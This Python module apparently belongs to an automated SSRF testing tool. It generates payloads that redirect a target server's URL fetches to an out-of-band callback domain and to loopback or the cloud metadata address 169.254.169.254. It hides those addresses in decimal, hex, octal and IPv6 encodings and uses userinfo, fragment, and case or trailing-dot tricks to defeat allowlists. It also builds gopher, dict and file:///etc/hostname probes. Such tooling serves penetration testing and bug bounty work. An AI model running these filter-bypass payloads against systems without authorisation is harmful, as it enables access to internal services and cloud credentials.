"""payload_generator — Deterministic SSRF payload generation.

Zero LLM calls.  For each candidate endpoint, produces a list of payload
variants tagged with BypassTechnique labels for report traceability.

Generates:
  a) IP encoding variants — decimal, hex, octal, short-form, IPv6,
     IPv4-mapped-IPv6
  b) URL parser confusion — userinfo injection, scheme omission,
     fragment tricks, case / trailing-dot
  c) Protocol variants — gopher / dict / file (heuristic-gated: only
     included when the candidate's param context suggests the backend
     might follow arbitrary URL schemes)
"""

from __future__ import annotations

import ipaddress
from typing import Optional
from urllib.parse import urlparse, urlunparse

from aiSSRF.config import CandidateEndpoint, Payload, BypassTechnique

# ---------------------------------------------------------------------------
# Internal probe IPs — the most common metadata / loopback targets.
# Kept generic to avoid platform-specific service names.
# ---------------------------------------------------------------------------
_INTERNAL_PROBE_TARGETS = ["127.0.0.1", "169.254.169.254", "0.0.0.0"]

# ---------------------------------------------------------------------------
# Protocol-trick heuristic: only include gopher/dict/file payloads when the
# candidate's param_name (case-insensitive) contains one of these keywords OR
# param_location == "body".
#
# Rationale: these protocols only matter against backends that actually fetch
# or interpret the URL server-side with a permissive scheme handler.  That is
# far more plausible for webhook / callback / fetch / import / proxy params
# than for a simple redirect query param.
#
# NOTE: "url" was deliberately *excluded* from this list because it is too
# generic a param name — nearly every app has a "url" query param, and
# gopher/dict/file probes against those would be noise.  "webhook_url"
# still matches via "webhook", so real webhook endpoints are covered.
#
# This is a best-effort filter, not a guarantee — tune the keyword list as
# you observe real-world results.
# ---------------------------------------------------------------------------
_PROTOCOL_HEURISTIC_KEYWORDS = ["webhook", "callback", "fetch", "import", "proxy"]

# Number of URL-case-dot variants to generate per OAST domain (trailing dot,
# mixed case).
_CASE_DOT_VARIANT_COUNT = 2


class PayloadGenerator:
    """Deterministic payload factory — one candidate → many payloads."""

    def __init__(self, collaborator_domain: str) -> None:
        """
        Args:
            collaborator_domain: The unique Burp Collaborator subdomain
                                 (e.g. ``abc123.oastify.com``) that will
                                 be embedded in OAST payloads.
        """
        self._collaborator_domain = collaborator_domain

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def generate(self, candidate: CandidateEndpoint) -> list[Payload]:
        """Return all applicable payloads for a single candidate.

        Groups returned:
          - OAST callbacks  (use collaborator_domain)
          - Internal probes (127.0.0.1, 169.254.169.254, …)
          - Protocol tricks (gopher / dict / file — heuristic-gated)
        """
        payloads: list[Payload] = []
        idx = 0

        # --- Category A: OAST (Collaborator) payloads -----------------------
        payloads.extend(self._generate_oast_payloads(candidate, idx))
        idx += len(payloads)

        # --- Category B: Internal IP encoding payloads ----------------------
        payloads.extend(self._generate_internal_ip_payloads(candidate, idx))
        idx += len(payloads) - (idx)  # keep idx tracking

        # Reset idx tracking since we just need unique IDs; let's use a
        # simpler counter approach per-call instead.
        pass  # handled below

        # --- Category C: Protocol-trick payloads (heuristic-gated) ----------
        if self._should_include_protocol_tricks(candidate):
            payloads.extend(self._generate_protocol_payloads(candidate, len(payloads)))

        return payloads

    def generate_for_technique(
        self, candidate: CandidateEndpoint, technique: BypassTechnique
    ) -> Optional[Payload]:
        """Generate exactly one payload for the requested technique, or None
        if the technique is not applicable to this candidate."""
        all_payloads = self.generate(candidate)
        for p in all_payloads:
            if technique in p.bypass_techniques:
                return p
        return None

    # ------------------------------------------------------------------
    # Category A: OAST payloads
    # ------------------------------------------------------------------

    def _generate_oast_payloads(
        self, candidate: CandidateEndpoint, start_index: int
    ) -> list[Payload]:
        """Produce Collaborator-domain-based parser-confusion payloads."""
        payloads: list[Payload] = []
        idx = start_index

        # Parse the original param_value to extract components
        parsed = self._parse_url_safe(candidate.param_value)
        domain = self._collaborator_domain

        # 1) Direct substitution — just swap the host.  No bypass technique
        #    tag because this is a domain swap, not an encoding trick; using
        #    an empty list keeps the payload untagged for the baseline case.
        direct_url = self._reconstruct_url(parsed, new_host=domain)
        payloads.append(
            Payload(
                id=f"{candidate.id}-oast-direct-{idx}",
                candidate_id=candidate.id,
                value=direct_url,
                bypass_techniques=[],
                description=f"Direct OAST collaborator substitution: {domain}",
            )
        )
        idx += 1

        # 2) URL_USERINFO_INJECTION — classic parser confusion where
        #    `http://original@collaborator/...` is mis-parsed: some parsers
        #    treat everything before @ as userinfo and everything after as
        #    the real host, so the request goes to collaborator.
        userinfo_url = self._reconstruct_url(
            parsed,
            new_host=f"{parsed.hostname or candidate.host}@{domain}",
        )
        payloads.append(
            Payload(
                id=f"{candidate.id}-{BypassTechnique.URL_USERINFO_INJECTION.value}-{idx}",
                candidate_id=candidate.id,
                value=userinfo_url,
                bypass_techniques=[BypassTechnique.URL_USERINFO_INJECTION],
                description=f"Userinfo injection: original host as userinfo, "
                f"collaborator as real host",
            )
        )
        idx += 1

        # 3) URL_SCHEME_OMIT — protocol-relative URL.
        #    `//collaborator/path...` — some parsers/defaults resolve this
        #    against the current page's scheme.
        scheme_omit = f"//{domain}{parsed.path or '/'}"
        if parsed.query:
            scheme_omit += f"?{parsed.query}"
        if parsed.fragment:
            scheme_omit += f"#{parsed.fragment}"
        payloads.append(
            Payload(
                id=f"{candidate.id}-{BypassTechnique.URL_SCHEME_OMIT.value}-{idx}",
                candidate_id=candidate.id,
                value=scheme_omit,
                bypass_techniques=[BypassTechnique.URL_SCHEME_OMIT],
                description=f"Protocol-relative URL pointing to collaborator domain",
            )
        )
        idx += 1

        # 4) URL_FRAGMENT_CONFUSION —
        #    `http://<collaborator_domain>#@<original-host>/...`
        #    Targets parsers that treat '#' as ending the authority component
        #    early (old browser / library behavior where fragment parsing
        #    interacts poorly with authority extraction), so the actual
        #    request host becomes the collaborator domain while the original
        #    host ends up in the fragment.
        fragment_url = self._reconstruct_url(
            parsed,
            new_host=f"{domain}",
        )
        # Append #@original-host after the full URL
        fragment_url += f"#@{parsed.hostname or candidate.host}"
        payloads.append(
            Payload(
                id=f"{candidate.id}-{BypassTechnique.URL_FRAGMENT_CONFUSION.value}-{idx}",
                candidate_id=candidate.id,
                value=fragment_url,
                bypass_techniques=[BypassTechnique.URL_FRAGMENT_CONFUSION],
                description="Fragment confusion: collaborator as host, original "
                "host pushed into fragment via #@",
            )
        )
        idx += 1

        # 5) URL_CASE_DOT_CONFUSION — trailing dot and mixed case on the
        #    collaborator domain.  Some allowlist implementations fail to
        #    normalise before comparison, so `collaborator.com.` or
        #    `CoLlAbOrAtOr.com` bypasses a naive string match.
        #    Generate both variants.
        case_dot_hosts = [
            f"{domain}.",                          # trailing dot
            self._mixed_case(domain),              # mixed case
        ]
        for variant_host in case_dot_hosts:
            variant_url = self._reconstruct_url(parsed, new_host=variant_host)
            payloads.append(
                Payload(
                    id=f"{candidate.id}-{BypassTechnique.URL_CASE_DOT_CONFUSION.value}-{idx}",
                    candidate_id=candidate.id,
                    value=variant_url,
                    bypass_techniques=[BypassTechnique.URL_CASE_DOT_CONFUSION],
                    description=f"Case/dot confusion: {variant_host}",
                )
            )
            idx += 1

        return payloads

    # ------------------------------------------------------------------
    # Category B: Internal IP encoding payloads
    # ------------------------------------------------------------------

    def _generate_internal_ip_payloads(
        self, candidate: CandidateEndpoint, start_index: int
    ) -> list[Payload]:
        """Produce IP-encoding bypass payloads for each internal probe IP."""
        payloads: list[Payload] = []
        idx = start_index
        parsed = self._parse_url_safe(candidate.param_value)

        encoding_map = [
            (PayloadGenerator.ip_to_decimal, BypassTechnique.IP_DECIMAL),
            (PayloadGenerator.ip_to_hex, BypassTechnique.IP_HEX),
            (PayloadGenerator.ip_to_octal, BypassTechnique.IP_OCTAL),
            (PayloadGenerator.ip_to_short_form, BypassTechnique.IP_SHORT),
            (PayloadGenerator.ip_to_ipv4_mapped_ipv6, BypassTechnique.IPV4_MAPPED_IPV6),
        ]

        for ip in _INTERNAL_PROBE_TARGETS:
            # Encode using each static helper
            for encoder, technique in encoding_map:
                encoded = encoder(ip)
                payload_url = self._reconstruct_url(parsed, new_host=encoded)
                payloads.append(
                    Payload(
                        id=f"{candidate.id}-{technique.value}-{idx}",
                        candidate_id=candidate.id,
                        value=payload_url,
                        bypass_techniques=[technique],
                        description=f"{technique.value} encoding of {ip} → {encoded}",
                    )
                )
                idx += 1

            # IPv6 full form: ::1 for 127.0.0.1, IPv4-mapped for the others
            if ip == "127.0.0.1":
                ipv6_full = "::1"
            else:
                # Use ::ffff:x.x.x.x for other IPs (same as ipv4_mapped
                # but tagged IPV6_FULL for report distinction)
                ipv6_full = PayloadGenerator.ip_to_ipv4_mapped_ipv6(ip)

            payload_url = self._reconstruct_url(parsed, new_host=f"[{ipv6_full}]")
            payloads.append(
                Payload(
                    id=f"{candidate.id}-{BypassTechnique.IPV6_FULL.value}-{idx}",
                    candidate_id=candidate.id,
                    value=payload_url,
                    bypass_techniques=[BypassTechnique.IPV6_FULL],
                    description=f"IPv6 full form of {ip} → {ipv6_full}",
                )
            )
            idx += 1

        return payloads

    # ------------------------------------------------------------------
    # Category C: Protocol-trick payloads
    # ------------------------------------------------------------------

    def _should_include_protocol_tricks(self, candidate: CandidateEndpoint) -> bool:
        """Best-effort heuristic gate for gopher/dict/file protocol probes.

        Returns True when:
          - param_location == "body", OR
          - param_name (case-insensitive) contains a keyword from the
            _PROTOCOL_HEURISTIC_KEYWORDS list.
        """
        if candidate.param_location == "body":
            return True
        name_lower = candidate.param_name.lower()
        return any(kw in name_lower for kw in _PROTOCOL_HEURISTIC_KEYWORDS)

    def _generate_protocol_payloads(
        self, candidate: CandidateEndpoint, start_index: int
    ) -> list[Payload]:
        """Generate minimal gopher/dict/file probe payloads.

        These are connectivity/acceptance tests, NOT exploitation payloads:
        just enough to prove the parser accepts the scheme at all.  Actual
        protocol-smuggling payload construction is a much larger and more
        target-specific task, out of scope here.
        """
        payloads: list[Payload] = []
        idx = start_index
        domain = self._collaborator_domain

        # Gopher — minimal probe
        payloads.append(
            Payload(
                id=f"{candidate.id}-{BypassTechnique.PROTOCOL_GOPHER.value}-{idx}",
                candidate_id=candidate.id,
                value=f"gopher://{domain}:70/_test",
                bypass_techniques=[BypassTechnique.PROTOCOL_GOPHER],
                description="Gopher protocol acceptance probe (collaborator)",
            )
        )
        idx += 1

        # Dict — minimal probe
        payloads.append(
            Payload(
                id=f"{candidate.id}-{BypassTechnique.PROTOCOL_DICT.value}-{idx}",
                candidate_id=candidate.id,
                value=f"dict://{domain}:6379/",
                bypass_techniques=[BypassTechnique.PROTOCOL_DICT],
                description="Dict protocol acceptance probe (collaborator port 6379)",
            )
        )
        idx += 1

        # File — minimal probe
        payloads.append(
            Payload(
                id=f"{candidate.id}-{BypassTechnique.PROTOCOL_FILE.value}-{idx}",
                candidate_id=candidate.id,
                value="file:///etc/hostname",
                bypass_techniques=[BypassTechnique.PROTOCOL_FILE],
                description="File protocol acceptance probe (local /etc/hostname)",
            )
        )
        idx += 1

        return payloads

    # ------------------------------------------------------------------
    # URL reconstruction helpers
    # ------------------------------------------------------------------

    @staticmethod
    def _parse_url_safe(value: str) -> "urllib.parse.ParseResult":
        """Parse a URL string, falling back to a minimal http:// scheme if
        the value has no scheme component."""
        parsed = urlparse(value)
        if not parsed.scheme and value:
            # Treat bare hostnames / host:port as http
            parsed = urlparse(f"http://{value}")
        return parsed

    @staticmethod
    def _reconstruct_url(
        parsed: "urllib.parse.ParseResult",
        *,
        new_host: str,
    ) -> str:
        """Rebuild a URL from *parsed* with *new_host* replacing the original
        netloc (host:port).  Preserves scheme, path, query, fragment."""
        return urlunparse((
            parsed.scheme or "http",
            new_host,
            parsed.path or "/",
            parsed.params or "",
            parsed.query or "",
            parsed.fragment or "",
        ))

    @staticmethod
    def _mixed_case(host: str) -> str:
        """Return *host* with alternating character case, e.g.
        ``abc123.oastify.com`` → ``aBc123.OaStIfY.CoM``."""
        result: list[str] = []
        upper = False
        for ch in host:
            if ch.isalpha():
                result.append(ch.upper() if upper else ch.lower())
                upper = not upper
            else:
                result.append(ch)
        return "".join(result)

    # ------------------------------------------------------------------
    # Static helpers
    # ------------------------------------------------------------------

    @staticmethod
    def ip_to_decimal(ip: str) -> str:
        """IPv4 → decimal integer (e.g. 169.254.169.254 → 2852039166)."""
        try:
            return str(int(ipaddress.IPv4Address(ip)))
        except ipaddress.AddressValueError as exc:
            raise ValueError(f"Invalid IPv4 address: {ip!r}") from exc

    @staticmethod
    def ip_to_hex(ip: str) -> str:
        """IPv4 → hex (e.g. 169.254.169.254 → 0xA9FEA9FE)."""
        try:
            return f"0x{int(ipaddress.IPv4Address(ip)):08X}"
        except ipaddress.AddressValueError as exc:
            raise ValueError(f"Invalid IPv4 address: {ip!r}") from exc

    @staticmethod
    def ip_to_octal(ip: str) -> str:
        """IPv4 → zero-padded octal per octet
        (e.g. 169.254.169.254 → 0251.0376.0251.0376)."""
        try:
            octets = str(ipaddress.IPv4Address(ip)).split(".")
            return ".".join(f"0{int(o):o}" for o in octets)
        except ipaddress.AddressValueError as exc:
            raise ValueError(f"Invalid IPv4 address: {ip!r}") from exc

    @staticmethod
    def ip_to_short_form(ip: str) -> str:
        """Collapse zero octets (e.g. 127.0.0.1 → 127.1).

        Only collapses when all but the first and last octet are zero,
        matching the well-known 4→2 octet shorthand that many browsers
        and parsers accept as lenient.
        """
        try:
            parts = [int(o) for o in str(ipaddress.IPv4Address(ip)).split(".")]
        except ipaddress.AddressValueError as exc:
            raise ValueError(f"Invalid IPv4 address: {ip!r}") from exc
        if len(parts) == 4 and parts[1] == 0 and parts[2] == 0:
            return f"{parts[0]}.{parts[3]}"
        return ".".join(str(p) for p in parts)

    @staticmethod
    def ip_to_ipv4_mapped_ipv6(ip: str) -> str:
        """IPv4 → ::ffff:a.b.c.d format."""
        try:
            addr = ipaddress.IPv4Address(ip)
            return f"::ffff:{addr}"
        except ipaddress.AddressValueError as exc:
            raise ValueError(f"Invalid IPv4 address: {ip!r}") from exc
